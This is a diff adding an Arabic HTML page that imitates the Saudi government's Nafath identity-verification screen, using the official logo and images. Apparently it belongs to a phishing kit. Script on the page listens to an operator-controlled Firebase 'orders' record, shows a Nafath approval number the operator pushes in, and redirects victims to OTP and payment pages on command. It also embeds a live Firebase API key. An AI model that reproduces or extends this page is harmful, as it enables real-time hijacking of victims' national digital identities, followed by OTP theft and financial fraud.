@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد نفاذ - تري</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root { --nafath-green: #006a4d; --bg-gray: #f4f4f4; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        
+        /* شريط المعالجة العلوي المطابق للصورة */
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .loading-box { background: white; padding: 25px; border-radius: 12px; text-align: center; width: 90%; max-width: 380px; }
+        .loader-bar { width: 100%; height: 12px; background: #eee; border-radius: 6px; overflow: hidden; margin: 15px 0; display: flex; gap: 2px; }
+        .bar-segment { flex: 1; background: #2ecc71; animation: pulse 1.2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
+
+        .container { width: 100%; max-width: 450px; background: white; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
+        .header { padding: 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+        .header img { height: 35px; }
+        
+        .p-body { padding: 25px; text-align: center; }
+        
+        /* مربع الرقم السحري */
+        .number-box { width: 100px; height: 100px; border: 2px solid var(--nafath-green); border-radius: 15px; margin: 20px auto; display: flex; align-items: center; justify-content: center; font-size: 45px; font-weight: bold; color: var(--nafath-green); background: #f9f9f9; }
+        
+        .instruction-main { font-size: 16px; color: #333; font-weight: 600; line-height: 1.6; margin-bottom: 10px; }
+        .timer { font-size: 18px; color: #d35400; font-weight: bold; margin: 15px 0; }
+        
+        /* خطوات نفاذ المصورة */
+        .steps-container { display: flex; justify-content: space-between; gap: 10px; margin-top: 30px; }
+        .step-card { flex: 1; background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 10px; text-align: center; }
+        .step-card img { width: 100%; border-radius: 5px; margin-bottom: 10px; }
+        .step-card h4 { font-size: 13px; color: var(--nafath-green); margin: 5px 0; }
+        .step-card p { font-size: 11px; color: #777; line-height: 1.4; }
+    </style>
+</head>
+<body>
+
+<div id="overlay" class="loading-overlay">
+    <div class="loading-box">
+        <p style="font-size: 14px; margin: 0;">الرجاء فتح تطبيق نفاذ وتأكيد طلب ربط الطلب على رقم الجوال بإختيار الرقم الذي سوف يظهر .</p>
+        <div class="loader-bar">
+            <div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div>
+        </div>
+        <div style="font-size: 13px; color: #666;">جاري المعالجة ، نرجو الإنتظار ...</div>
+    </div>
+</div>
+
+<div class="container">
+    <div class="header">
+        <div>☰</div>
+        <img src="https://iam.gov.sa/static/media/logo.8e294157.svg" alt="Nafath">
+    </div>
+
+    <div class="p-body">
+        <div class="number-box" id="nafath-number">??</div>
+        
+        <p class="instruction-main">الرجاء فتح تطبيق نفاذ وتأكيد ربط الطلب على رقم الجوال بإختيار الرقم أعلاه .</p>
+        
+        <div class="timer" id="timer">00:60</div>
+
+        <div class="steps-container">
+            <div class="step-card">
+                <img src="https://iam.gov.sa/static/media/step1.png" alt="step1" onerror="this.src='https://placehold.co/100x100?text=نفاذ'">
+                <h4>الخطوة 1</h4>
+                <p>تحميل تطبيق نفاذ</p>
+            </div>
+            <div class="step-card">
+                <img src="https://iam.gov.sa/static/media/step2.png" alt="step2" onerror="this.src='https://placehold.co/100x100?text=بصمة'">
+                <h4>الخطوة 2</h4>
+                <p>اختيار الرقم أعلاه والتحقق عبر السمات الحيوية</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // إعدادات Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const userId = localStorage.getItem('user_id');
+    const numberDisplay = document.getElementById('nafath-number');
+
+    // إخفاء اللودر تلقائياً
+    setTimeout(() => { document.getElementById('overlay').style.display = 'none'; }, 4000);
+
+    // الرقابة المباشرة على قاعدة البيانات لسحب الرقم
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists && doc.data().nafath_code) {
+                // تحديث المربع بالرقم الموجود في حقل nafath_code
+                numberDisplay.innerText = doc.data().nafath_code;
+                numberDisplay.style.color = "#006a4d";
+            }
+        });
+    }
+
+    // العداد التنازلي
+    let timeLeft = 60;
+    const timerElement = document.getElementById('timer');
+    setInterval(() => {
+        if (timeLeft > 0) {
+            timeLeft--;
+            timerElement.innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+        }
+    }, 1000);
+    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+</body>
+</html>
+
